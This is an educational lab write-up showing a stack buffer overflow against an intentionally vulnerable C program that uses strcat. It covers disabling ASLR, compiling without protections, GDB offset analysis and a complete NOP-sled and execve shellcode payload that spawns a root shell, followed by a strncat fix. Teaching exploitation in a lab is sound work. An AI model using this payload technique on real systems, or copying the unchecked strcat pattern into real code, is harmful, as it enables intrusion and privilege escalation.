description: Stack-based buffer overflow example with shellcode injection on the stack
goal: The goal of this laboratory is to perform a buffer overflow attack by exploiting a vulnerable c program (more specifically the strcat function) in order to inject the shellcode on the stack obtaining a shell with root privileges
solution:
Vulnerable Code

The program vulnerable to the buffer overflow attack is the following:

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc,char** argv){

    char buff[50];
    buff[0] = 's';
    buff[1] = 't';
    buff[2] = 'r';
    buff[3] = ':';
    strcat(buff,argv[1]);
    printf("%s \n",buff);
    return 1;

}

The above program is located in the NSP1 folder of the hacking machine.
Its execution is very simple, in fact it append a string, entered from the command line, to one already statically present in the buff[] variable. As you can see, the vulnerability of this program consists in carrying out the concatenation of the strings, using the strcat() function, within the same variable, without any type of control on the size neither by the same function nor by the developer .

 

1. Adrress Space Layout Randomization Check

Address Space Layout Randomization (ASLR) is a cybersecurity technique involved in preventing the exploitation of memory corruption vulnerabilities. So the first thing we need to do is check for a specific value in Linux, which can be set to:

  • 0: disabled;
  • 1: conservative;
  • 2: full randomization

The check can be done using the following command:

cat /proc/sys/kernel/randomize_va_space

If the result of the command is different from 0, you need to disable the ASLR via the following command:

echo 0 > /proc/sys/kernel/randomize_va_space

To enable it again, it is possible to repeat the same command replacing the numerical value corresponding to the preferred randomization type.

 

2. Compiling and testing the program

To compile the program it's necessary to move to the NSP1 folder and then use the gcc compiler, with the following flags:

  • -fno-stack-protector: do not emit extra code to check for buffer overflows;
  • -no-pie: do not produce a Position Independent Executable (PIE);
  • -z execstack: option passed straight to the linker and marking the object code as requiring executable stack;
  • -ggdb: Produce debugging information for use by GDB.

Here is the whole command to be executed:

gcc -fno-stack-protector -no-pie -z execstack -o target strcat.c -ggdb

The image below shows the execution of the program with a non-offending input:

Instead this other with an offending input ( > 60 characters):

 

3. Program analysis with GDB

To understand the buffer size we need to analyze the program using gdb. It allows us to disassemble a specific function of the target program, giving us the assembly code. In order to run the program with gdb, we need to use the following command:

gdb ./target

So we are ready to disassemble the main() function of the program and check the buffer size that is allocated on the stack:

(gdb) disas main

By default, gdb supports two different types of disassembly flavors: att and intel. there are small differences between these flavors, eg. the order in which the suorce and destination operands are represented in the instructions.
You can switch between them using the gdb command:

(gdb) set disassembly-flavor intel

The image above is an example of the att flavor, while the one below shows the intel flavor

From the dump above it's possible to know the memory area allocated for the buff[] variable, that is 64 bytes (0x40 in hexadecimal) above the base pointer register (rbp). You can see this, e.g., from the instruction "lea rax, [rbp-0x40]" that is used to prepare the parameters in view of the call to the strcat function in the main. Pay attention to the fact that 4 of the total 64 bytes are occupied by the statically allocated string "str:", which is why the space available to fill with the "NOP sled + shellcode + padding" byte array is 60 + 8 (old frame pointer) bytes long. After this bytes we will find the return address that will replaced with the "stack smashing" string address on the stack.

 

4. Building the stack smashing string

first of all, for this laboratory, we will use a simple shellcode taken from exploit database (downlodable  here.). the code launches a /bin/sh shell by calling the execve system call, it is 23 bytes long and written in hexadecimal format as shown below:

\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05

Now, to build the stack smashing string we have to respect the following requirements:

  1. It contains a sufficient number of NOP bytes, so to allow for a certain degree of precision lack with respect to the chosen modified return address;
  2. It contains the 23 bytes long shellcode we discussed earlier;
  3. It contains a few padding bytes allowing to fill the memory gap between the end of the shell code and the start of the stack area containing the return address (such bytes will also cover the area occupied by the old frame pointer);
  4. It has a trailer that is (in Intel's little endian format) the modified return address.

Here is how the stack smashing string should look like:

[NOP (e.g., 25 bytes)][SHELLCODE (23 bytes)][PADDING (DIM(buff) - # static string inserted ("str:") - # of NOPs - DIM(shellcode) = 72-4-25-23=20][MODIFIED_RET_ADDRESS]

Please Note: Intel 64-bit architectures define canonicalized address spaces, as explained here. This means that the [MODIFIED_RET_ADDRESS] above can be represented with just 6 bytes (the least significant ones) and will be sign-extended to 64bits.

To get the stack smashing string, we will use the python command which allows replication of characters, or portions of strings, as shown below:

python -c 'print "\x90"*25+"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"+"A"*20+ "B"*6'

By executing the string just shown on the target program in gdb, we get the output in figure:

The inserted string allowed us to obtain a segmentation fault, crashing the program. For this reason, let's see in detail what happened in the:

  • processor registers
    (gdb) info register



    As shown in the figure, the base pointer register (rbp) has been replaced with the hexadecimal values ​​corresponding to "A" (0x41) as expected. Furthermore, the instruction register (rip) has also been replaced with the hexadecimal values ​​corresponding to the "B" (0x42). All we have to do is replace the six "B" with an appropriate memory address in order to run a shell with root privileges by executing the shellcode;

  • memory state
    (gdb) x/10s $rsp-74


    The command used parameters indicate: x allows us to print the contents of the memory, / 10s gives us the result in the form of 10 strings and finally $rsp-74 places 74 bytes above the stack pointer.
    As shown in the image above, the "stack smashing" string is located at the address 0x7fffffffe5f6. So we will use the same python command, seen previously, replacing the obtained address at the 6 "B".
    In particular, it is necessary to write the address in the little endian format, to make it conform to the representation required by intel processors. The address will be:
    "\x7f\xff\xff\xff\xe5\xf6"[::-1]

 

5. The Attack!

Thanks to the address obtained in the previous point, we can finally carry out the exploit, by running the target program in gdb with the following command:

python -c 'print "\x90"*25+"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"+"A"*20+"\x7f\xff\xff\xff\xe5\xf6"[::-1]'

The exploit has worked because the shellcode was executed, giving us a new shell with root privileges. Enjoy the hack :D

 

Defend against Buffer Overflow

In this case the buffer overflow attack can be avoided by replacing the strcat function with strncat. Unlike strcat, it provides an additional parameter that defines how many characters to copy into the destination string, in order to avoid buffer overflow.
In the NSP1 folder there is a "strcatSafe" file containing the following code:

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc,char** argv){

    char buff[50];
    buff[0] = 's';
    buff[1] = 't';
    buff[2] = 'r';
    buff[3] = ':';
    strncat(buff,argv[1],46);
    printf("%s \n",buff);
    return 1;

}

Let's compile it using the command already seen in the point 2:

gcc -fno-stack-protector -no-pie -z execstack -o safe strcatSafe.c -ggdb

At this point we can run it with either a valid...

... or an invalid input.

Neither of the two inputs show segmentation faults errors.
author: danilo
